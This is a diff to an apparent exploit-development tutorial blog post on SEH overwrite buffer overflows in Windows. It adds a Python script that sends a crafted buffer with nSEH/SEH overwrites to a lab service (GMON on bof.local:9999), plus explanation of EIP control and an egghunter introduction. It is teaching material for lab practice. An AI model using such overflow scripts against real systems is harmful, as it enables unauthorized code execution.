@@ -38,7 +38,7 @@ Let's jump right into it.
 
 
 
-Before we jump into looking at this from a exploitation perspective let's first talk about what **Exception Handlers** *really are*, the different ypes and what purpose they service within the Windows OS. 
+Before we jump into looking at this from a exploitation perspective let's first talk about what **Exception Handlers** *really are*, the different types and what purpose they service within the Windows OS. 
 
 
 
@@ -195,12 +195,74 @@ As you can see here we have not overwritten the **EIP Register** with `41414141`
 
 
 
-I won't go into specifics but basically we just fuzz with a never-repeating string and calculate the offset. Let me show you. 
+I won't go into deep specifics but this if we can *fuzz* a never-repeating string and then calculate the offset that we overwrite the **SE Handler** & **SE Record** with data of our choice which could be used to control EIP. 
+
+
+
+With the below example I analyzed that the offset too **SE Record** was `3519 Bytes` therefore I added 4 x B's over **SE Record** and 4 x C's over **SE Handler**. Check out the script below.
+
+
+
+```python
+#!/usr/bin/python
+import socket
+import sys
+
+
+nseh = "BBBB" 
+seh = "CCCC"
+
+buffer="A" * 3515
+buffer += nseh
+buffer += seh
+
+junk = "D"*(4500-len(buffer))
+buffer += junk
+
+try:
+	print "[*] Starting to Fuzz GMON"
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect(('bof.local',9999))
+	print "[*] Connected to bof.local on Port 9999"
+	s.send(('GMON /.:/' + buffer))
+	print "[*] Finished Fuzzing Check SEH Chain on Immunity"
+	s.close()
+except:
+	print "couldn't connect to server"
+```
 
 
 
 
 
+Now if we jump over **Immunity** and check out the **SEH Chain** we will see the below.
+
+
+
+<p align = "center">
+<img src ="https://i.imgur.com/JWDAV87.png">
+</p>
+
+
+
+Let me first show you something, at the current moment the application is in a crashed state (of course) but we can still pass the exception to program by pressing **Shift+F9** - If we do this we can notice something interesting.
+
+
+
+The value of **SE Handler** on the stack is pushed to the **EIP Register**  which of course is not ideal! We can now control the execution flow of the overall program.
+
+
+
+
+<p align ="center">
+<img src ="https://i.imgur.com/2QC3RBq.png">
+</p>
+
+
+
+
+
+#### [](#header-4) A Mention on POP POP RET
 
 
 
@@ -212,6 +274,32 @@ I won't go into specifics but basically we just fuzz with a never-repeating stri
 
 
 ## [](#header-2) Egghunters 101
+
+
+
+
+
+#### [](#header-4) What is an Egghunter?
+
+
+
+*An Egghunter is a small piece of shellcode, typically 32 Bytes that can be used to redirect execution flow to our final stage shellcode when we have a small space of memory to work with*
+
+
+
+
+
+#### [](#header-4) So How Do Egghunters Work?
+
+
+
+
+
+
+
+
+
+
 
 
 
